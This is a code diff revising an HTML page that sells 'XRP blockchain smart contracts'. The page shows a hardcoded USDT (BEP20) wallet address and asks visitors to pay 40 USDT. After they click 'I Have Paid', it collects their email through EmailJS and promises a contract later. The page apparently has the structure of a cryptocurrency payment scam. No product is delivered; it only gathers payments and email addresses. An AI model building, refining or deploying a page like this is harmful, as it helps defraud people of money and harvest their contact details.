@@ -2,105 +2,108 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>XRP Smart Contract Sale</title>
+<title>XRP Contract Purchase</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+(function(){
+  emailjs.init("PakuuN4ADUDEqrzHl");
+})();
+</script>
 
 <style>
 body{
   margin:0;
-  font-family:Inter,sans-serif;
+  font-family:Inter,Arial,sans-serif;
   background:url("https://s.yimg.com/ny/api/res/1.2/Phc5HvvKu4xvPceFYLoFPw--/YXBwaWQ9aGlnaGxhbmRlcjt3PTY0MDtoPTQ1MDtjZj13ZWJw/https://media.zenfs.com/en-US/the_block_83/8988da1e9af1c61405c181decc49bb91")
-  center/contain no-repeat fixed;
-  background-color:#0b1220;
+  center / contain no-repeat fixed;
+  background-color:#000;
   min-height:100vh;
-  color:#fff;
 }
 
 .overlay{
-  background:rgba(0,0,0,0.55);
+  background:rgba(0,0,0,.65);
   min-height:100vh;
-  padding:40px 16px;
+  padding:40px 15px;
 }
 
 .container{
   max-width:520px;
   margin:auto;
-  background:rgba(255,255,255,0.95);
-  color:#111;
+  background:rgba(255,255,255,.96);
   border-radius:18px;
-  padding:28px;
+  padding:30px;
+  box-shadow:0 20px 40px rgba(0,0,0,.5);
 }
 
 .logo{
   text-align:center;
   font-size:28px;
-  font-weight:800;
+  font-weight:700;
   letter-spacing:2px;
-  margin-bottom:10px;
+  margin-bottom:20px;
 }
 
-.desc{
+p{
   text-align:center;
-  font-size:14px;
-  margin-bottom:20px;
+  color:#333;
 }
 
 .btn{
   width:100%;
-  padding:12px;
+  padding:14px;
+  margin-top:12px;
   border:none;
   border-radius:10px;
+  font-size:16px;
   font-weight:600;
   cursor:pointer;
-  margin-top:12px;
 }
 
 .primary{background:#0d6efd;color:#fff;}
-.secondary{background:#198754;color:#fff;}
-.gray{background:#6c757d;color:#fff;}
+.gray{background:#e5e5e5;}
+.green{background:#28a745;color:#fff;}
 
 .box{
-  background:#f1f3f5;
-  padding:14px;
-  border-radius:12px;
-  margin-top:14px;
-  font-size:14px;
+  background:#f5f5f5;
+  padding:15px;
+  border-radius:10px;
+  margin-top:15px;
+  display:none;
 }
 
 input{
   width:100%;
-  padding:10px;
+  padding:12px;
   margin-top:10px;
   border-radius:8px;
   border:1px solid #ccc;
+  font-size:15px;
 }
 
-.hidden{display:none;}
+.address{
+  font-weight:600;
+  word-break:break-all;
+  margin-top:8px;
+}
 
-.loader{
-  margin:20px auto;
+.copy{
+  font-size:14px;
+  margin-top:6px;
+}
+
+.spinner{
   width:40px;
   height:40px;
   border:4px solid #ccc;
   border-top:4px solid #0d6efd;
   border-radius:50%;
   animation:spin 1s linear infinite;
+  margin:15px auto;
 }
 
-@keyframes spin{
-  0%{transform:rotate(0deg)}
-  100%{transform:rotate(360deg)}
-}
-
-footer{
-  text-align:center;
-  margin-top:30px;
-  font-size:12px;
-  opacity:.7;
-}
+@keyframes spin{to{transform:rotate(360deg)}}
 </style>
 </head>
 
@@ -110,70 +113,73 @@ footer{
 
     <div class="logo">NEW CONTRACT</div>
 
-    <div class="desc">
-      Buy and create XRP blockchain smart contracts.<br>
-      Ripple contract signing available instantly.
-    </div>
+    <p>
+      Purchase and create a new XRP blockchain contract.<br>
+      Secure Ripple smart contract issuance available now.
+    </p>
 
     <button class="btn primary" onclick="showPayment()">Create Contract</button>
 
-    <div id="paymentBox" class="box hidden">
-      <strong>Payment Address (USDT BSC - BEP20)</strong><br><br>
-      <code id="addr">0xef42d9b6502ae425aeb4f28099a3041392481a52</code>
-      <button class="btn gray" onclick="copyAddr()">Copy Address</button>
-      <p>Send <strong>40 USDT</strong> to create your XRP contract.</p>
-      <button class="btn secondary" onclick="showEmail()">I Have Paid</button>
+    <div class="box" id="paymentBox">
+      <p><b>Payment Information</b></p>
+      <div class="address">
+        0xef42d9b6502ae425aeb4f28099a3041392481a52
+      </div>
+      <div>USDT BSC (BEP20)</div>
+      <div class="copy">
+        Amount required: <b>40 USD</b>
+      </div>
+      <button class="btn gray" onclick="copyAddress()">Copy Address</button>
+      <button class="btn green" onclick="showEmail()">I Have Paid</button>
     </div>
 
-    <div id="emailBox" class="box hidden">
-      <label>Your Email</label>
-      <input type="email" id="userEmail" placeholder="example@email.com">
-      <button class="btn primary" id="confirmBtn" onclick="sendEmail()" disabled>Confirm</button>
+    <div class="box" id="emailBox">
+      <p>Enter your email address</p>
+      <input type="email" id="userEmail" placeholder="your@email.com">
+      <button class="btn primary" onclick="sendEmail()">Confirm</button>
     </div>
 
-    <div id="loadingBox" class="hidden">
-      <div class="loader"></div>
-      <p style="text-align:center">
-        If payment is completed, your contract will be sent to your email.
+    <div class="box" id="statusBox">
+      <div class="spinner"></div>
+      <p>
+        If payment is completed,<br>
+        your contract will be reviewed and sent to your email.
       </p>
     </div>
 
-    <footer>© 2026 XRP Contract Platform</footer>
   </div>
 </div>
 
 <script>
-(function(){
-  emailjs.init("PakuuN4ADUDEqrzHl");
-})();
-
 function showPayment(){
-  document.getElementById("paymentBox").classList.remove("hidden");
+  document.getElementById("paymentBox").style.display="block";
 }
 
-function showEmail(){
-  document.getElementById("emailBox").classList.remove("hidden");
-}
-
-function copyAddr(){
-  navigator.clipboard.writeText(document.getElementById("addr").innerText);
+function copyAddress(){
+  navigator.clipboard.writeText("0xef42d9b6502ae425aeb4f28099a3041392481a52");
   alert("Address copied");
 }
 
-document.getElementById("userEmail").addEventListener("input",function(){
-  document.getElementById("confirmBtn").disabled = !this.value;
-});
+function showEmail(){
+  document.getElementById("emailBox").style.display="block";
+}
 
 function sendEmail(){
-  const email = document.getElementById("userEmail").value;
-  document.getElementById("emailBox").classList.add("hidden");
-  document.getElementById("loadingBox").classList.remove("hidden");
+  const email=document.getElementById("userEmail").value;
+  if(!email){
+    alert("Please enter your email");
+    return;
+  }
 
-  emailjs.send(
-    "service_j8bd9vn",
-    "template_paduqpn",
-    { user_email: email }
-  );
+  emailjs.send("service_j8bd9vn","template_paduqpn",{
+    email: email,
+    title: "XRP Contract Purchase"
+  }).then(()=>{
+    document.getElementById("emailBox").style.display="none";
+    document.getElementById("statusBox").style.display="block";
+  },()=>{
+    alert("Email sending failed");
+  });
 }
 </script>
 
